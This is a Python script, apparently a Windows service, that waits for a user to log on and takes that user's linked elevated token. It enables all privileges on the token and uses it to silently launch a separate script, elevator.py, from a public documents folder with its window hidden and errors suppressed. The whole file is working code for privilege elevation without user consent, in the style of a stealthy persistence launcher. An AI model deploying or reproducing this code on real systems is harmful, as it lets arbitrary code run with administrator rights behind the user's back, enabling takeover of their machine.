import win32ts
import win32security
import win32process
import win32con
import sys
import os
import time

def get_active_session():
    sessions = win32ts.WTSEnumerateSessions(win32ts.WTS_CURRENT_SERVER_HANDLE, 1, 0)
    for session in sessions:
        if session['State'] == win32ts.WTSActive:
            return session['SessionId']
    return None

def launch_elevator():
    # Wait for user to log in
    while True:
        active_session = get_active_session()
        if active_session is not None:
            break
        time.sleep(5)
    
    # Get user token
    user_token = win32ts.WTSQueryUserToken(active_session)
    
    # Get linked elevated token
    TOKEN_LINKED_TOKEN = 19
    elevated_token = win32security.GetTokenInformation(user_token, TOKEN_LINKED_TOKEN)
    
    # Duplicate token
    token_dup = win32security.DuplicateTokenEx(
        elevated_token,
        win32security.SecurityImpersonation,
        win32con.MAXIMUM_ALLOWED,
        win32security.TokenPrimary,
        None
    )
    
    # Enable all privileges
    privileges = win32security.GetTokenInformation(token_dup, win32security.TokenPrivileges)
    new_privileges = [(luid, win32security.SE_PRIVILEGE_ENABLED) for luid, flags in privileges]
    win32security.AdjustTokenPrivileges(token_dup, False, new_privileges)
    
    # Launch elevator.py (no window)
    elv_dir = r"C:\Users\Public\Documents\elv"
    elevator_path = os.path.join(elv_dir, "elevator.py")
    
    startup = win32process.STARTUPINFO()
    startup.dwFlags = win32con.STARTF_USESHOWWINDOW
    startup.wShowWindow = win32con.SW_HIDE
    startup.lpDesktop = ""
    
    win32process.CreateProcessAsUser(
        token_dup,
        None,
        f'"{sys.executable}" "{elevator_path}"',
        None,
        None,
        False,
        win32con.CREATE_NO_WINDOW,
        None,
        None,
        startup
    )

# Launch elevator
try:
    launch_elevator()
except:
    pass

# Keep service alive
while True:
    time.sleep(10)